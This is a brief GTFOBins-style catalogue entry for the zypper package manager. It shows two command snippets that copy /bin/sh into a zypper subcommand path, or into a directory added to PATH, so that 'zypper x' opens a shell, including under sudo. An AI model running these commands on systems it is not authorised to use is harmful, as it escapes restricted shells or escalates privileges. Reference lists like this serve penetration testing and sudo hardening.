---
type: gtfobin
name: zypper
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# zypper

## shell

```bash
cp /bin/sh /usr/lib/zypper/commands/zypper-x
zypper x
```
_The copy usually requires elevated privileges._
**Contexts:** sudo, unprivileged

```bash
cp /bin/sh /path/to/temp-dir/zypper-x
PATH=$PATH:/path/to/temp-dir/ zypper x
```
**Contexts:** sudo, unprivileged
